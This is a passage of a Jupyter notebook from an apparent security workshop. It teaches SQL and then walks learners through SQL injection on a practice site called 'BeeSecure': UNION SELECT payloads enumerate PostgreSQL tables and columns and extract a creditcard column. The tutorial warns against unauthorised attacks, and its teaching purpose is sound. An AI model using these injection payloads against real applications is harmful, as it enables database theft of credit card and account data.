   "metadata": {},
   "source": [
    "## Databases\n",
    "\n",
    "Websites do all sorts of different things. There are websites for sharing videos, checking your bank account, booking flights, and much more. But one thing that is common among many different websites is their ability to *manage information*. Whether that be video files, bank balances, or flight schedules, websites almost always have the functionality to *create* (or add) information, later *read* or *update* that information, and finally *delete* it. Different pieces of information may also have all sorts of links between them that a website manages. For example an airline website contains both user account details and flight schedule details, but then connects to two together to store lists of bookings.\n",
    "\n",
    "*Bonus:* If you're interested, later checkout the acronym [CRUD](https://en.wikipedia.org/wiki/Create,_read,_update_and_delete).\n",
    "\n",
    "Rather than re-inventing the wheel everytime someone creates a website, this functionality is provided for websites by other dedicated pieces of software: websites are built on top of **databases**.\n",
    "\n",
    "When our client accesses a website often the server will use our input to *query* the database and add/retrieve/update/remove information as needed based on what we've requested the website to do.\n",
    "\n",
    "Maybe you can see where this is going. Maybe you can't just yet.\n",
    "\n",
    "Either way we need to learn more about these *queries* that webservers send to databases. In particular the language they're written in.\n",
    "\n",
    "## SQL\n",
    "Whilst there are many different kinds of databases that a website can use, many of them share a common language \n",
    "called **S**tructured **Q**uery **L**anguage.\n",
    "\n",
    "Let's look at a quick example. Suppose our website allows users to login. The database needs to store this. So we might have a *table* of users. When we talk about database tables we're talking about abstract datastructures, but the term is inspired by written tables you might see in books or reports. Just like written tables they have *columns* and *rows*. Each column can hold a particular kind of information, and a row contains a set of entries under each column for one record. For example suppose a table called `users` in a database might look something like this if it was written out:\n",
    "\n",
    "|id (number)| username (string) | password (string)|\n",
    "|--------------|-----------|------------|\n",
    "|0|john|john_is_cool|\n",
    "|1|jane|jane_is_rad|\n",
    "\n",
    "The `users` table has three columns, `id`, `username`, and `password`. They each have a type, `number`, `string`, and `string` respectively. We can see the table has two entries, or rows, each one representing a user.\n",
    "\n",
    "SQL `SELECT` queries allow us to get data from tables. We can choose which columns we want from which table. For example if we wanted all of the `username` values from the `users` table we could write the SQL query:\n",
    "```SQL\n",
    "SELECT username FROM users\n",
    "```\n",
    "This would return `john` and `jane`. We could ask for both `username` and `password`:\n",
    "```SQL\n",
    "SELECT username, password FROM users\n",
    "```\n",
    "Which would return two pairs, `('john','john_is_cool')` as well as `('jane','jane_is_rad')`. We can also restrict which rows we're interested in with conditions by adding a `WHERE <condition>` on the end. For example if we only wanted `john`'s password:\n",
    "```SQL\n",
    "SELECT password FROM users WHERE username == 'john'\n",
    "```\n",
    "\n",
    "Which would return `john_is_cool`.\n",
    "\n",
    "**Excercise**\n",
    "- Can you write an SQL query which finds the id and username of a user with the password 'flying_saucer'?\n",
    "\n",
    "This is just the very crude basics of SQL. SQL is a very mature and powerful technology with lots of advanced features.\n",
    "\n",
    "It might not quite seem like it, but in the same way we talked about HTML and JavaScript being code on the client side, SQL is a special form of code that gets executed on the server side (along with many others!).\n",
    "\n",
    "To achieve server side code injection, can we try and trick the server into reading our input as SQL? Enter SQL injection.\n",
    "\n",
    "## SQL Injection\n",
    "As we've talked about earlier, a good way to exploit a sytstem is to try and trick it into reading your input as a user as code. This is often possible with SQL code if the programmer of the website hasn't been careful. Consider our example from above. To login to the website the server might need to check a password and so run a query like:\n",
    "```SQL\n",
    "SELECT password FROM users WHERE username == 'john'\n",
    "```\n",
    "But it needs to be able to run this with whatever username we provide, so what we enter in a text entry box on the login screen might end up inside the query:\n",
    "```SQL\n",
    "SELECT password FROM users WHERE username == '<user_entry>'\n",
    "```\n",
    "\n",
    "What if the username was `geoff`? \n",
    "```SQL\n",
    "SELECT password FROM users WHERE username == 'geoff'\n",
    "```\n",
    "\n",
    "Ok, what if I enter the username `nonsenicalUsername' UNION SELECT 'ChosenString`. I end up with the SQL query:\n",
    "```SQL\n",
    "SELECT password FROM users WHERE username == 'nonsenicalUsername' UNION SELECT 'ChosenString'\n",
    "```\n",
    "\n",
    "The `UNION` allows the results of two SQL queries to be combined into one longer list of results. The first query looks for a password for a user called `'nonsenicalUsername'` and so returns nothing. The second query uses `SELECT` to return a constant value, not from the database. So it returns `'ChosenString'`. Do you see what's happened? We've used `'` in our user input. Since the website just put our string in without checking it carefully, we were able to break out of the original `username ==` spot and start putting in arbitrary SQL. So we've changed this query from one that looks for the password of a user to one that returns a string of our choice.\n",
    "\n",
    "This is called **SQL Injection**.\n",
    "\n",
    "Using the `badInput' UNION SELECT 'Injection success!` pattern can help us find SQL injection spots. If we put it into inputs we think are placed into SQL queries, then it should cause them to return `Injection success!` rather than what was intended.\n",
    "\n",
    "## Finding a Vulnerability\n",
    "Let's try this out on BeeSecure. We need to find a place where we think our input might be put into an SQL query **and** the results of our input are visible to us as a user.\n",
    "\n",
    "**Excercise**\n",
    "- Can you use the `badInput' UNION SELECT 'ChosenInput` pattern to find a text input box on BeeSecure that has an SQL injection vulnerability?\n",
    "\n",
    "Scroll down when you're done with the excercise to see the solution and move on to the next step...\n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "35e33854",
   "metadata": {},
   "source": [
    "Hopefully you've figured out that the 'Bio Search' search bar is vulnerable to SQL injection. Great news! We should be able to use this to run SQL queries over the database and have the results returned to us inside the 'Bio Search' results.\n",
    "\n",
    "What will we do with this? What advantage does it offer us over our original client-side attack? There's two opportunities here:\n",
    "1. We could use this to steal people's secrets more quietly, perhaps? Rather than having their secret sent as a message to the whole chat, it will only be visible to us in the 'Bio Search' results.\n",
    "2. We could steal secrets we couldn't with the server attack. Do you remember entering your credit card details earlier? Those aren't in the DOM so a client-side attack couldn't get them, maybe this will work?\n",
    "\n",
    "We'll chase up the second lead, and try steal credit card details, although both attacks would be very similar. Now to get the data we want, we'll need to craft an SQL query to inject. To craft an SQL query, we need to know more about how the database is structured. We need to **enumerate** the database.\n",
    "\n",
    "## Enumerating the Database\n",
    "To get the information we want out of the database we need to understand what data is available. We need to identify the **schema** of the database. That is what tables exist and what columns does each table have. Let's first try and figure out what tables are in our database.\n",
    "\n",
    "This can be tricky in general but we'll give you a hand. We're using a database called 'PostgreSQL' version 12.12. This kind of database has a *built-in* table called `pg_tables` which contains a list of all the tables in the database. The `pg_tables` table has a column called `tablename` which sounds pretty useful! So to figure out what tables exist in the database, we need to try and run the SQL query:\n",
    "```SQL\n",
    "SELECT tablename FROM pg_tables\n",
    "```\n",
    "\n",
    "Remember though, we're SQL injecting so we have to be a little cleverer. The SQL query we're injecting into probably looks something like this:\n",
    "```SQL\n",
    "SELECT ??? FROM ??? WHERE ??? = '<We-Inject-In-Here>'\n",
    "```\n",
    "\n",
    "If we enter `randomJunk' UNION SELECT tablename FROM pg_tables` we end up with the query:\n",
    "```SQL\n",
    "SELECT ??? FROM ??? WHERE ??? = 'randomJunk' UNION SELECT tablename FROM pg_tables'\n",
    "```\n",
    "\n",
    "This is almost right, but notice that pesky `'` on the end! Earlier our `' UNION SELECT 'ChosenString` worked because the final `'` ends the string `'ChosenString'`. Having a `'` dangling will break our query. Perhaps we can just put a `UNION SELECT 'ExtraResult` on the end? So we'll inject in `randomJunk' UNION SELECT tablename FROM pg_tables UNION SELECT 'ExtraResult`. This means the server will probably end up a query that looks something like:\n",
    "```SQL\n",
    "SELECT ??? FROM ??? WHERE ??? = 'randomJunk' UNION SELECT tablename FROM pg_tables UNION SELECT 'ExtraResult'\n",
    "```\n",
    "That looks promising!\n",
    "\n",
    "**Excercise**\n",
    "- Can you use our SQL injection vulnerability to list the tables in the database?\n",
    "- Can you see the `ExtraResult` listing we added in with our final `UNION SELECT 'ExtraResult`?\n",
    "- Can you see a table that is likely to be interesting in our seach for user credit card data? \n",
    "  - **Tip**: there will be lots of tables whose names make no sense. Don't worry! I have no idea what most of them are either! When we're exploiting a complicated system we have to pick and choose what we dig into. If you don't understand what a table name means, at this stage it's probably not something relevant. \n",
    "  - **Hint:** we're looking for *user* credit card data.\n",
    "  \n",
    "Scroll down when you're done with the excercise to see the solution and move on to the next step...\n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1496265f",
   "metadata": {},
   "source": [
    "If you spotted the `users` table, well done! It is indeed what we want to look for. Now we need to know what columns the table has. We've gone and figured out some of the details of PostgreSQL for you to save time.\n",
    "\n",
    "If we could just run an SQL query directly on the database to find the names of all columns of the `user` table it'd be:\n",
    "\n",
    "```SQL\n",
    "SELECT column_name FROM information_schema.columns WHERE table_name = 'users'\n",
    "```\n",
    "\n",
    "Of course we can't just run SQL queries. We have to inject them.\n",
    "\n",
    "**Excercise**\n",
    "- Use what you've learnt and seen to SQL inject the above query using the vulnerability in the 'Bio Search' bar and figure out which columns exist in the `users` table you identified earlier.\n",
    "\n",
    "Scroll down when you're done with the excercise to see the solution and move on to the next step...\n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0eaa3f2a",
   "metadata": {},
   "source": [
    "One way to inject the query could've been to input:\n",
    "```\n",
    "randomJunk' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' UNION SELECT 'fakeColumn\n",
    "```\n",
    "\n",
    "This gives the list of columns:\n",
    "```\n",
    "bio\n",
    "creditcard\n",
    "fakeColumn\n",
    "name\n",
    "password\n",
    "secret\n",
    "username\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6646ea53",
   "metadata": {},
   "source": [
    "Aha! In the `users` table there is a `creditcard` column.\n",
    "\n",
    "**Excercise**\n",
    "1. Write an SQL query that would return all the entries in the `creditcard` column of the `users` table\n",
    "2. SQL inject this query\n",
    "\n",
    "Scroll down when you're done with the excercise to see the solution and move on to the next step...\n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    \n",
    "&ensp;    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "736ccd73",
   "metadata": {},
   "source": [
    "One way to inject the query could've been to input:\n",
    "```\n",
    "randomJunk' UNION SELECT creditcard FROM users UNION SELECT 'fakeCard\n",
    "```\n",
    "\n",
    "And with this we have a nice list of credit cards!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "43678254",
   "metadata": {},
   "source": [
    "## Summary\n",
    "We've:\n",
    "- Learnt about SQL and the potential for SQL injection attacks\n",
    "- Identified an SQL injection vulnerability in BeeSecure\n",
    "- Use the SQL injection vulnerability to enumerate the database and find out where useful secrets are\n",
    "- Used our knowledge of the database to leak a set of credit cards"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "946f7a3a",
   "metadata": {},
   "source": [
    "# Overall Summary\n",
    "\n",
    "Hopefully you've learnt that:\n",
    "- Lots of different threats affect lots of different systems\n",
    "- One of the best ways to protect a network/website/piece of software is to attempt a friendly attack!\n",
    "- It's easier than you think to break the law and **you really really shouldn't**\n",
    "- No seriously, **never** attack or look for weaknesses in a system you don't have **explicit authorisation** to mess with\n",
    "- A common category of attacks involves tricking a system into interpreting malicious user input as code\n",
    "- Client-Side Code Injection allows threat actors to steal (or modify!) information in other client's browsers\n",
    "- Server-Side Code Injection, in particular SQL injection, allows threat actors to steal (or modify!) information in databases\n",
    "- Cyber security is super cool and you should all come join us working in it :)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cc26dce1",
   "metadata": {},
   "source": [
    "# Attack 3??\n",
    "\n",
    "If you've made it this far with time to spare then well done! You're probably looking for a challenge.\n",
    "\n",
    "**Final Bonus Challenge**  \n",
    "We'll give you a prize if you\n",
    "- Hack BeeSecure in a way that surprises us\n",
    "\n",
    "and/or\n",
    "\n",
    "- Gain control of the `Moderator` account through any means (Potential Hint: MD5)\n",
    "\n",
    "Try not to break the website since others are probably still working on earlier challenges. Let us know if you're unsure if something is safe to do and we'll take a look. But hey it happens, so if you do break the site don't stress. Just let us know and we'll fix it. :)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a882809a",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
